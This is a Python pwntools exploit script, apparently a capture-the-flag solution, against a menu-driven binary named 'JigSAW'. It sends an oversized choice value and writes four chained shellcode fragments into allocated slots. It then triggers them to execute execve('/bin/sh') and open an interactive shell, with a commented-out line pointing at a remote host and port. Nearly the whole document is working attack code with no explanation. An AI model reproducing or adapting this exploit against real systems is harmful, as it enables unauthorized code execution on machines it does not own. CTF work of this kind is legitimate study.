from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('JigSAW')
# io = process('JigSAW', env={"LD_PRELOAD":"./libc.so"})
# io = remote('47.104.70.90', 25315)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc.so')
elf = ELF('JigSAW')


def add(index):
    io.sendlineafter('Choice : \n', '1')
    io.sendlineafter('Index? : \n', str(index))


def edit(index, content):
    io.sendlineafter('Choice : \n', '2')
    io.sendlineafter('Index? : \n', str(index))
    io.sendafter('iNput:\n', content)


def test(index):
    io.sendlineafter('Choice : \n', '4')
    io.sendlineafter('Index? : \n', str(index))


def pwn():
    shellcode1 = asm("mov rsp, rdx\n add rsp, 0x20\n push rsp")
    shellcode2 = asm("mov rax, 0x68732f6e69622f\n add rsp, 0x20\n push rsp")
    shellcode3 = asm("push rax\n mov rdi, rsp\n xor rsi, rsi\n add rsp, 0x28\n push rsp")
    shellcode4 = asm("xor rdx, rdx\n mov rax, 59\n syscall\n")
    '''
    log.success('shellcode1\'s size: ' + str(len(shellcode1)))
    log.success('shellcode2\'s size: ' + str(len(shellcode2)))
    log.success('shellcode3\'s size: ' + str(len(shellcode3)))
    log.success('shellcode4\'s size: ' + str(len(shellcode4)))
    '''
    io.sendlineafter('Name:\n', 'aaaa')
    io.sendlineafter('Make your Choice:\n', str(0xf00000000))

    add(0)
    add(1)
    add(2)
    add(3)
    edit(0, shellcode1)
    edit(1, shellcode2)
    edit(2, shellcode3)
    edit(3, shellcode4)
    # gdb.attach(io)
    test(0)
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()
